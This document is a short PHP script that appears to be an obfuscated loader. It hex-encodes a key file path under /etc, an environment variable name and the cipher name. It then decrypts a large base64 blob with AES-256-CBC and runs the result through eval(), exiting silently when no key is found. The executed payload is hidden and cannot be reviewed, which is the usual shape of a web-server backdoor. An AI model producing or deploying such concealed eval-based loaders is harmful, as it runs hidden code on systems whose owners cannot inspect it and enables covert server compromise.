<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('gWyOUDg1iUNXbv3l6s4flg==');

$c=base64_decode(

'ApAxOq0LY3wxTHj4HiMOuRXDPJC1ng+GQd2HMk3dl8geiKLs8NAw+/MnaFYHsDItsKvRlxsb3uME' .
'uf9+M9VDfX7vEGRlOTprkQTrBvd4/pF7NynpDkdvp/4yrl3hRPm4U/xVBidyv7TU4ig8LLQku6Wl' .
'D2PZ6yB87aI7Zk00uJlvXlEI6Gw3QBL62sf6QrTXLX7re4gojbVA7vhsdDsSGGAzwo+lC/PaoeAH' .
'JjjHUUraCXoW/pCIwZ//Zgg3tjhbh4ZEGGPjmzrNy2BObn9hJCjW+lVswLBbSVLMfnTH/C/VV5P1' .
'ufxFShIeJ51FOSI4p+bgp3a6ssrpfNALymb09Z1ve+bofOOApldUeVLPnaSDLlZrBW1au661saTO' .
'7+6DLlex7y7bcZpIiNEoUIfzQWxSv13xsxMNeaXsxzgumydlNN6X32gfpuvmhvUaXpeRfCnSIpmZ' .
'9NiImW26vwWLAZuIEdJWV1eXR6YA9Cb20LoCcYnaO0d8sXY7g218f2yhjWjT1Yk0cLh0i+8fRdJZ' .
'6jZd0q4VyBpzbQtdx9SGhpoVdfmgXodpGbFRObzCY8GKU1Z/1RjXPHu3tfqxiTcUoKwDXv/9cXax' .
'1mYMmRr/lN3HKMu8S88Mj6qT8JSyUn8IaiUlHy7qVe3wzJaK6IusjhjGEpx7VoL0vrXuda13T3lW' .
'mSuKK8ra/nja55XSDY6YuYV5Xr4PqOSTKMsZUqbR5BVgDHWZAY37L/9NfmD3aA11xtvj+Oddx6NL' .
'Je88itW7yjkMRxlNvbUXprI6xb9fTW9qquKBJ+kdPIRvQK2QNe7VAongwmxniFxjBpAB0fB2mMeH' .
'uvfoCSLGK9GgyTSlXI0ZpUOhWGf0+D4SZcwWPKriaP6kliGirn20aBg5uWGcdHmKIc6ZCA5jY52X' .
'yQHcQp3+6IIY3vii1jZIjYHzN2NaHjxJ6WOvlSe/yCVWPCvDZhIz9GyN5NM9xDk6Qxmlj9wc2bRF' .
'hsbaUM2DBtSz/AlgwRjuGRmW5aXV5sy1PdvtVQLwE579D5rjq8GtF7nZFpqEHTzEPchD0MVokrS6' .
'Ta2bzfji3PwO5Xla97VSgvmF0DDIMgyuj24Stfu3j/fyX+Hfpra1Q0bH4nLxUey0b8vCvgYP7ObA' .
'mfu/3jlkK7V6sMZtqyjYFACuq/DVKVMEklIOmyCSxkdP6JO8trhIa++RHsCS323Qica+jMPOayw6' .
'm8+nrBvn6PyOSwEZLib/iNHQG6sAIz0n3+HrDYhs6NHPzxcZub2WmO8T31sH2MGzoGyULYCGN6ak' .
'avaRRatQ+umdnIrNFaHHsbgyR/noIHTby+uByAV9oqeZVKhqG54NA5an1LQeN4Gv7TBcBsWT2Q=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

